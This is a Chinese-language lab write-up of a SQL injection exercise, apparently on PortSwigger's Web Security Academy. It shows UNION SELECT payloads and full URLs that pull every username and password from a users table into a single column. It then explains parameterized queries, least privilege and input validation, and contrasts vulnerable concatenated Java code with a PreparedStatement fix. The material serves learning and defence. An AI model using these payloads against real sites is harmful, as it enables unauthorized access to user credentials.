实验名称：SQL注入UNION攻击，从单个列中检索多个值
实验编号：Sql注入（6）


🎯 实验目标：
     通过sql注入，选择商品分类，在同一列中，显示全部的用户名和密码。


🧠 漏洞原理：
     通过网站注入，先查询users分表有多少列，那些列能够存储数据。依旧是字符串拼接注入
     '+UNION+SELECT+NULL,'abc'--
     '+UNION+SELECT+NULL,username||'~'||password+FROM+users--


🔧 攻击过程
     步骤1：寻找注入点，登录网页选择分类，查询有几列，那列可以存储数据
              https://0abe004b034fbe6681591bf40014002e.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27abc%27--           
              此时页面正常，存在两列且第二列可以存储数据
              sql-6.1图
              SELECT * FROM products WHERE category = 'Corporate+gifts''+UNION+SELECT+NULL,'abc'--

     步骤2：开始检索users表中的所有用户名和密码  
                 https://0abe004b034fbe6681591bf40014002e.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--
                 此时页面中同时显示出来用户名和密码
                 sql-6.2图
      
     注入成功/总结：1.不同数据库中的拼接符号不同？    
                                 Oracle         ||双竖线
                                 Sql Server    +号
                                 MySql          CONCAT(  )

     三层防御手段：   第一层：参数化查询               结构与数据分离          UNION 等关键字被降级为普通字符串，攻击语句彻底失效。
                              第二层：最小权限原则            Web账户只授予业务必需权限（如仅查products表）                      即使注入成功，也无权读取 users 表，数据库直接拒绝访问。
                              第三层：输入校验 / WAF        拦截 '、UNION、; 等危险字符或关键字。                                      挡掉自动扫描器（但不能单独依赖，黑客有多种绕过技巧）。
                             输入校验有白名单策略和黑名单策略
                             白名单策略就是只允许预先设定好的正常数据通过         代码写死：if category in ["Gifts", "Electronics", "Clothing"]。其他的一律拒绝。
                             黑名单策略就是只拦截已知的错误数据 （如 '、UNION、;），其他的放行。                        检测到 UNION 就拦截，没检测到就放行。





🎯防御手段：  参数化查询，SQL的结构和用户输入的数据分离，添加占位符号
                 漏洞代码： 字符串拼接          用户输入直接拼进SQL，用户说什么SQL就执行什么
String category = request.getParameter("category");                                                             创建一个叫 category 的文本盒子，把用户传过来的 category 值放进去
String query = "SELECT * FROM products WHERE category = '" + category + "'";                   生成一条完整的SQL语句，把用户输入的内容直接拼到末尾
Statement stmt = connection.createStatement();   // 这个对象直接执行SQL                             从数据库连接里造一个信使出来
ResultSet rs = stmt.executeQuery(query);          // 拼接后的SQL交给数据库                              信使拿着 query 盒子里的SQL语句，跑去数据库执行，然后把结果带回来。


                  安全代码：参数化查询           用?占位，结构和数据分开传，用户输入只当普通文本用
String category = request.getParameter("category");                                                             把用户输入存进一个叫 category 的文本盒子
String query = "SELECT * FROM products WHERE category = ?";   // 这里改了（用占位符）     告诉数据库，我要查 category 等于某个值的数据，但具体是什么值我一会儿再告诉你
PreparedStatement pstmt = connection.prepareStatement(query); // 这里改了（换对象）       把带有占位符的 query 先“定稿”，告诉数据库：“我的结构是这样的，接下来你只负责填数据
pstmt.setString(1, category);                                 // 这里新增（绑定参数）                             告诉升级版信使：把用户输入的内容，作为纯数据，填到刚才留空的那个位置
ResultSet rs = pstmt.executeQuery();                          // 这里改了（执行方式）                       升级版信使去执行，这里 没有 把 query 传进去，因为 query 的结构已经固定好了，pstmt 自己就知道要执行什么

安全代码和漏洞代码的主要区别就在于，安全代码增加了 （？占位符号）和（ stmt.setString(1, category);  固定输入文本为纯数据）这两点
